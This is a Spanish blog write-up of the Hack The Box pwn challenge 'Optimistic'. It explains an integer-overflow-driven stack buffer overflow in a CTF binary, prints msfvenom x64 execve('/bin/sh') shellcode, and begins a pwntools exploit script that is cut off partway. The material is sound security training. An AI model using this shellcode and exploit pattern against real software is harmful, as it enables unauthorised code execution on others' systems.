<!doctype html><html lang="es"><head><title>Optimistic | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="Binario de 64 bits. _Buffer Overflow_. _Integer Overflow_. _Shellcode_ alfanumérico"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Binario de 64 bits. _Buffer Overflow_. _Integer Overflow_. _Shellcode_ alfanumérico"><meta itemprop="keywords" content><meta itemprop="name" content="Optimistic"><meta property="article:published_time" content><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="Binario de 64 bits. _Buffer Overflow_. _Integer Overflow_. _Shellcode_ alfanumérico"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="Optimistic"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/ctf/htb-challenges/pwn/optimistic/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="Binario de 64 bits. _Buffer Overflow_. _Integer Overflow_. _Shellcode_ alfanumérico"><meta name="twitter:description" content="Binario de 64 bits. _Buffer Overflow_. _Integer Overflow_. _Shellcode_ alfanumérico"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="Optimistic"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/ctf/htb-challenges/pwn/optimistic/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/ctf/htb-challenges/pwn/optimistic/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/htb-challenges/pwn/optimistic/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/htb-challenges/pwn/optimistic/&amp;text=Optimistic" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/ctf/htb-challenges/pwn/optimistic/&amp;title=Optimistic" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Optimistic</h1><p class="mb4 f6 dib tracked">9 minutos de lectura</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#ingeniería-inversa">Ingeniería inversa</a></li><li><a href="#vulnerabilidad-de-_buffer-overflow_">Vulnerabilidad de <em>Buffer Overflow</em></a></li><li><a href="#explotación-de-_buffer-overflow_">Explotación de <em>Buffer Overflow</em></a><ul><li><a href="#depuración-con-gdb">Depuración con GDB</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona un binario de 64 bits llamado <code>optimistic</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little
RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
Stack:    <span class="code-dark-red">No canary found</span>
NX:       <span class="code-dark-red">NX disabled</span>
PIE:      <span class="code-dark-green">PIE enabled</span>
RWX:      <span class="code-dark-red">Has RWX segments  
</code></pre></div><h2 id="ingeniería-inversa">Ingeniería inversa</h2><p>Si usamos Ghidra, veremos el código fuente descompilado en C para la función <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> number;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">ssize_t</span><span class="mtk1"> read_length;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">uint</span><span class="mtk1"> length;</span>
<span class="mtk1">  undefined4 local_80;</span>
<span class="mtk1">  undefined2 local_7c;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> option;</span>
<span class="mtk1">  undefined local_79;</span>
<span class="mtk1">  undefined email[</span><span class="mtk6">8</span><span class="mtk1">];</span>
<span class="mtk1">  undefined age[</span><span class="mtk6">8</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> name[</span><span class="mtk6">96</span><span class="mtk1">];</span>
<span class="mtk1">  </span>
<span class="mtk1">  </span><span class="mtk8">initialize</span><span class="mtk1">();</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Welcome to the positive community!"</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"We help you embrace optimism."</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Would you like to enroll yourself? (y/n): "</span><span class="mtk1">);</span>
<span class="mtk1">  number </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">getchar</span><span class="mtk1">();</span>
<span class="mtk1">  option </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">char</span><span class="mtk1">) number;</span>
<span class="mtk1">  </span><span class="mtk8">getchar</span><span class="mtk1">();</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk4">'y'</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Too bad, see you next time :("</span><span class="mtk1">);</span>
<span class="mtk1">    local_79 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">6e</span><span class="mtk1">;</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Great! Here</span><span class="mtk6">\'</span><span class="mtk4">s a small welcome gift: </span><span class="mtk6">%p\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">stack0xfffffffffffffff8);</span>  
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Please provide your details."</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Email: "</span><span class="mtk1">);</span>
<span class="mtk1">  read_length </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, email, </span><span class="mtk6">8</span><span class="mtk1">);</span>
<span class="mtk1">  local_7c </span><span class="mtk5">=</span><span class="mtk1"> (undefined2) read_length;</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Age: "</span><span class="mtk1">);</span>
<span class="mtk1">  read_length </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, age, </span><span class="mtk6">8</span><span class="mtk1">);</span>
<span class="mtk1">  local_80 </span><span class="mtk5">=</span><span class="mtk1"> (undefined4) read_length;</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Length of name: "</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%d</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">length);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk6">64</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) length) {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Woah there! You shouldn</span><span class="mtk6">\'</span><span class="mtk4">t be too optimistic."</span><span class="mtk1">);</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Name: "</span><span class="mtk1">);</span>
<span class="mtk1">  read_length </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, name, (ulong) length);</span>
<span class="mtk1">  length </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>

<span class="mtk1">  </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk7 mtki">int</span><span class="mtk1">) read_length </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">9</span><span class="mtk1"> </span><span class="mtk5">&lt;=</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) length) {</span>
<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Thank you! We</span><span class="mtk6">\'</span><span class="mtk4">ll be in touch soon."</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    number </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">isalpha</span><span class="mtk1">((</span><span class="mtk7 mtki">int</span><span class="mtk1">) name[(</span><span class="mtk7 mtki">int</span><span class="mtk1">) length]);</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> ((number </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> (</span><span class="mtk6">9</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) name[(</span><span class="mtk7 mtki">int</span><span class="mtk1">) length] </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">30</span><span class="mtk5">U</span><span class="mtk1">)) </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">    length </span><span class="mtk5">=</span><span class="mtk1"> length </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Sorry, that</span><span class="mtk6">\'</span><span class="mtk4">s an invalid name."</span><span class="mtk1">);</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">  </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>En primer lugar, debemos poner <code>"y"</code> para continuar con el programa. Luego, se nos da una dirección de pila (<em>stack</em>) como regalo. Después de algunos datos, se nos dice que ingresemos la longitud de nuestro nombre, y se almacena como un número entero.</p><h2 id="vulnerabilidad-de-_buffer-overflow_">Vulnerabilidad de <em>Buffer Overflow</em></h2><p>En el código anterior podemos ver que <code>name</code> es una cadena de caracteres de 96 bytes, pero se nos permite controlar la variable <code>length</code>, que es el número de bytes que se leerán de <code>stdin</code>. Nótese que <code>length</code> es <code>int</code> y se cambia a <code>ulong</code>, por lo que tenemos una vulnerabilidad de <em>Buffer Overflow</em> ocasionada por una vulnerabilidad de <em>Integer Overflow</em>. Por ejemplo, si ponemos <code>-1</code> como <code>length</code>, será interpretado como <code>0xffffffffffffffff</code> (como <code>ulong</code>), que da lugar al <em>Buffer Overflow</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./optimistic</span>
Welcome to the positive community!
We help you embrace optimism.
Would you like to enroll yourself? (y/n): y
Great! Here's a small welcome gift: 0x7ffe68cdb240
Please provide your details.
Email: asdf
Age: asdf
Length of name: -1
Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
Thank you! We'll be in touch soon.
zsh: segmentation fault (core dumped)  ./optimistic
</code></pre></div><p>Cuando el programa quiere retornar de <code>main</code>, la dirección de retorno guardada en la pila ha sido sobrescrita con <code>0x4141414141414141</code> (nuestros datos de entrada). Como no es una dirección de memoria válida, el programa simplemente se rompe (violación de segmento o <em>segmentation fault</em>).</p><h2 id="explotación-de-_buffer-overflow_">Explotación de <em>Buffer Overflow</em></h2><p>En primer lugar, nos gustaría controlar la ejecución del programa. Como se trata de un binario de 64 bits sin canario, el <em>offset</em> será <code>96 + 8 = 104</code> (por que después del <em>buffer</em> reservado se encuentra el valor anterior de <code>$rbp</code> y la dirección de retorno guardada). Por tanto, necesitamos exactamente 104 bytes para alcanzar la posición de la dirección de retorno guardada en la pila.</p><p>Como NX está deshabilitado, podemos introducir <em>shellcode</em> en la pila y ejecutarlo. Para esto, podemos aprovecharnos de la fuga de memoria y sobrescribir la dirección de retorno con una dirección conocida. Luego, en lugar de poner bytes cualesquiera, pondremos <em>shellcode</em> para obtener una <em>shell</em>.</p><p>Por ejemplo, podemos usar <code>msfvenom</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">msfvenom</span> -p linux/x64/exec -f py
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload  
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 21 bytes
Final size of py file: 117 bytes
buf =  b""
buf += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50"
buf += b"\x54\x5f\x52\x5e\x6a\x3b\x58\x0f\x05"
</code></pre></div><h3 id="depuración-con-gdb">Depuración con GDB</h3><p>Podemos comenzar con este <em>script</em> en Python y depurar un poco con GDB:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env python3</span>

<span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk8 mtku">pwn</span><span class="mtk1"> </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk5">*</span>

<span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">binary</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'optimistic'</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">binary</span><span class="mtk1">.process()</span>

<span class="mtk1">    </span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk1">port</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">split</span><span class="mtk1">(</span><span class="mtk4">':'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">remote</span><span class="mtk1">(</span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">port</span><span class="mtk1">))</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk4">'break *main+482</span><span class="mtk6">\n</span><span class="mtk4">continue'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Would you like to enroll yourself? (y/n): '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'y'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Great! Here</span><span class="mtk6">\'</span><span class="mtk4">s a small welcome gift: '</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">stack_leak</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">().</span><span class="mtk8">decode</span><span class="mtk1">(), </span><span class="mtk6">16</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Stack leak: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">stack_leak</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">shellcode</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x</span><span class="mtk6">54\x5f\x52\x5e\x6a\x3b\x58\x0f\x05</span><span class="mtk4">'</span>  

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Email: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'asdf'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Age: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'qwer'</span><span class="mtk1">)</span>
